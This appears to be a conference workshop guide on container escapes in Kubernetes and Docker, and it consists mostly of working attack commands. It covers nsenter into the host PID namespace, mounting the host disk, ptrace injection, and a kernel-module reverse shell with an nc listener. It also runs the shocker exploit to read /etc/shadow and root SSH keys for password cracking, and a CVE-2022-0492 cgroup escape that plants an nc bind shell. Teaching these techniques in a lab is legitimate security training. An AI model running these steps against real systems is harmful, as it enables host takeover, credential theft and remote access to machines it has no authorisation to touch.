# TagesConf: container escape


# Setting Up Workspace

Start kubernetes cluster with [Killercode Kubernetes](https://killercoda.com/playgrounds/scenario/kubernetes).

# Privileged

## Let's play with linux namespaces, cgroups

On Host
```shell
ls -l /proc/$$/ns # on the host
```

In container
```shell
ls -l /proc/$$/ns # in the container
capsh --print
```

## Privileged+hostPID

Run privileged pod

```shell
kubectl apply -f 
kubectl exec -it privileged-hostpid -- bash
```

Enter to pid 1 namespaces.

```shell
ls -la /
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
ls -la /
```

## Mounting Disk

```shell
kubectl apply -f 
kubectl exec -it privileged -- bash
```

```shell
$ cat /proc/cmdline
init=/init loglevel=1 root=/dev/vdb rootfstype=erofs ro vsyscall=emulate panic=0 linuxkit.unified_cgroup_hierarchy=1 console=hvc0 tsc=reliable  virtio_net.disable_csum=1 eth0.IPNet=192.168.65.3/24 eth0.router=192.168.65.1 eth0.mtu=65535 eth1.dhcp vpnkit.connect=connect://2/1999 com.docker.VMID=2ebe4eef-0e69-4cab-9c09-0ba5ca9fcd57
$ blkid
/dev/vdb: UUID="f77c9dcd-aa75-4115-9035-4ace04a5efae" BLOCK_SIZE="4096" TYPE="erofs"
/dev/vdc: UUID="5c6189ad-6080-41e6-827f-f4f302ada263" BLOCK_SIZE="4096" TYPE="erofs"
/dev/vda1: UUID="9e7b9c89-6577-4495-80ee-fd511f955bd1" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="d08fb88d-01"
$ mount -o ro /dev/vda1 /mnt
$ ls -la /mnt
# or
$ debugfs /dev/vda1
```

References:
  - [Article: Reboot your pc from a docker container](https://disconnect3d.pl/2018/11/12/reboot-your-pc-from-a-docker-container/)
  - [tbhaxor: Container Breakout – Part 1 (LAB: Privileged Container)](https://tbhaxor.com/container-breakout-part-1/)


# hostNetwork

Deploy pods
```shell
kubectl apply -f 
kubectl apply -f 
kubectl get svc nginx
kubectl logs -f nginx-client
kubectl exec -it host-network -- bash
```

Sniff requests
```shell
ifconfig
tcpdump -i any -v 'tcp and host 10.110.149.83'
```


# 2 shells and mknode cap

https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot

https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/

# Excessive Capabilities

## CAP\_SYS\_PTRACE + hostPid

Spawn container
```shell
docker run -it --rm --cap-add=SYS_PTRACE --pid=host  ubuntu bash
# or
kubectl apply -f ...
kubectl exec -it cap-sys-ptrace -- bash
```

Check that we have ptrace capability
```shell
capsh --print | grep ptrace

gdb <pid>
# or
./cdk run check-ptrace
```

```shell
curl -L -o inject.c ...
gcc ./inject.c
./a.out
```

References:
  - [CDK Exploit ptrace](https://github.com/cdk-team/CDK/wiki/Exploit:-check-ptrace)
  - [Linux Inject](https://github.com/gaffe23/linux-inject) - Tool for injecting a shared object into a Linux process
  - [tbhaxor: Container Breakout – Part 1 (LAB: Process Injection)](https://tbhaxor.com/container-breakout-part-1/)


## CAP\_SYS\_MODULE

Print kernel version, architecture, hostname and build date
```shell
uname -a
```

Read kernel's boot image and the root UUID.
```shell
cat /proc/cmdline
```

Install linux-headers
```shell
apt install linux-headers-$(uname -r)
```

Change address to connect and compile module
```shell
curl -L -o Makefile
curl -L -o reverse-shell.c
ifconfig
vim reverse-shell.c
make
```

Start listenning no port 4444 for reverse shell and install module.
```shell
nc -klvnp 4444 &
insmod reverse-shell.ko
```
If you want to install module again, remove it before installing
```shell
rmmod reverse-shell.ko
```

Getting Full TTY
```shell
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

References:
  - [Writeup: How I Hacked Play-with-Docker and Remotely Ran Code on the Host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)


## CAP\_DAC\_READ\_SEARCH

Create pod
```shell
k apply -f 
```

Compile shocker exploit
```shell
curl -LO http://stealth.openwall.net/xSports/shocker.c
gcc ./shocker.c -o ./shocker
```

Find interesting file, foe example /etc/passwd and /etc/shadow
```shell
./shocker /etc/passwd passwd
./shocker /etc/shadow shadow
unshadow passwd shadow > unshadow.txt
john unshadow.txt
```

So you bruteforce `ubuntu` password, let's try to connect with it
```shell
ssh ubuntu@192.168.1.0
```

So, imagine that you didn't managed to bruteforce password, let's try to find some ssh keys.

```shell
./shocker /root/.ssh/id_rsa id_rsa
chmod 0600 id_rsa
ssh -i id_rsa root@192.168.1.0
```

References:
  - [Exploit: shocker.c](http://stealth.openwall.net/xSports/shocker.c)
  - [Article: Docker breakout exploit analysis](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)


## CAP\_DAC\_READ\_SEARCH + CAP\_DAC\_READ\_SEARCH

Same as above, but you can write to any file now. Just overwrite `authorized_keys` file.
## CAP\_SYS\_ADMIN

[Understanding docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

```shell
k apply -f - 
k exec -it cap-sys-admin -- bash
```

### CVE-2022-0492

```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
mount 
host_path=`mount | head -1 | sed -n 's/.*\perdir=\([^,]*\).*/\1/p'`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f' >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

References:
  - [New Linux Vulnerability CVE-2022-0492 Affecting Cgroups: Can Containers Escape?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)
  - [CAP_SYS_ADMIN Abusing usermod helper API](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#abusing-usermode-helper-api)


